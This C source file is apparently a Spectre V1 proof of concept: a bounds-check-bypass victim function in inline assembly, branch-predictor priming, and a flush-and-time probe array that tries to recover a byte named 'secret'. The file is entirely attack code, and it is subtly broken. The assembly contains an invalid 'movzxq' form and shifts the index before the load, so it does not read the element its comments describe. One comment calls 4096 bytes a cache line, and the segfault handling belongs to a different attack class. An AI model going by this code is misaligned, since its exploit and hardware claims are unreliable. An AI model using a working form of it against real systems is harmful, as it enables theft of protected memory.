#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <setjmp.h>
#include <signal.h>
#include <x86intrin.h> // For rdtsc, clflush

#define ARRAY_SIZE 16
#define PROBE_ARRAY_SIZE 256 * 4096 // 256 cache lines (4KB each)
#define CACHE_LINE_SIZE 64

unsigned char secret = 'S';
unsigned char public_array[ARRAY_SIZE] = {0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15};
unsigned char probe_array[PROBE_ARRAY_SIZE];

// JMPBUF for signal handler
static jmp_buf s_jmpbuf;

// Signal handler to recover from segfaults
void sigsegv_handler(int signum)
{
    longjmp(s_jmpbuf, 1);
}

// Function to flush a cache line
void flush_cache_line(void *addr)
{
    _mm_clflush(addr);
}

// Function to measure access time (simplified for demonstration)
uint64_t measure_access_time(void *addr)
{
    volatile uint32_t temp;
    uint64_t start_time, end_time;

    start_time = __rdtsc();
    temp = *(volatile uint32_t *)addr; // Access the memory
    end_time = __rdtsc();

    return end_time - start_time;
}

// Victim function with Spectre V1 vulnerability
void victim_spectre_v1(size_t index)
{
    if (index < ARRAY_SIZE)
    { // Vulnerable bounds check
        // Gadget: Read out-of-bounds speculatively, then use value to access probe_array
        __asm__ __volatile__(
            "movzxq %1, %1 \n\t"                              // Ensure index is zero-extended to 64-bit
            "shlq $12, %1 \n\t"                               // Multiply by 4096 (cache line size)
            "movq (%2, %1), %%rax \n\t"                       // Speculative load from public_array[index] * 4096 (into rax)
            "movzxq %%al, %%rax \n\t"                         // Get lower byte (the secret value)
            "shlq $12, %%rax \n\t"                            // Multiply by 4096 again
            "movq (%3, %%rax), %%rbx \n\t"                    // Access probe_array[speculative_value * 4096]
            :                                                 /* no output */
            : "r"(index), "r"(public_array), "r"(probe_array) // Input operands
            : "rax", "rbx"                                    // Clobbered registers
        );
    }
}

int main()
{
    // Setup signal handler for segfaults
    signal(SIGSEGV, sigsegv_handler);

    // Initialize probe array with known values and flush
    for (int i = 0; i < 256; i++)
    {
        probe_array[i * 4096 + 10] = 1; // Mark each cache line
        flush_cache_line(&probe_array[i * 4096]);
    }
    _mm_mfence(); // Ensure flushes complete

    printf("Secret: %c (ASCII %d)\n", secret, secret);

    // Prime the branch predictor: Access in-bounds many times
    for (int i = 0; i < 1000; i++)
    {
        victim_spectre_v1(i % ARRAY_SIZE);
    }
    _mm_mfence(); // Ensure priming completes

    // Attempt to leak secret:
    // This index is out of bounds (e.g., public_array + 16 for `secret`)
    size_t speculative_index = (size_t)(&secret - public_array);

    if (setjmp(s_jmpbuf) == 0)
    {
        printf("Attempting Spectre V1 attack with index %zu...\n", speculative_index);
        victim_spectre_v1(speculative_index); // This will cause the speculative access
    }
    else
    {
        printf("Segfault occurred, attack completed (or failed).\n");
    }

    _mm_mfence(); // Ensure speculative execution effects are visible in cache

    // Measure access times to find the leaked byte
    printf("Measuring probe array access times...\n");
    int leaked_byte = -1;
    uint64_t min_time = -1ULL;

    for (int i = 0; i < 256; i++)
    {
        uint64_t time = measure_access_time(&probe_array[i * 4096]);
        // A significantly lower time indicates a cache hit
        if (time < 80)
        { // Threshold for a cache hit (adjust based on your system)
            printf("  Probe_array[%d*4096] accessed in %llu cycles (potential hit)\n", i, time);
            if (time < min_time)
            {
                min_time = time;
                leaked_byte = i;
            }
        }
    }

    if (leaked_byte != -1)
    {
        printf("Likely leaked byte: %c (ASCII %d)\n", (char)leaked_byte, leaked_byte);
        if (leaked_byte == secret)
        {
            printf("SUCCESS: Leaked byte matches actual secret!\n");
        }
        else
        {
            printf("FAILURE: Leaked byte does NOT match actual secret.\n");
        }
    }
    else
    {
        printf("No byte leaked or could not detect leakage.\n");
    }

    return 0;
}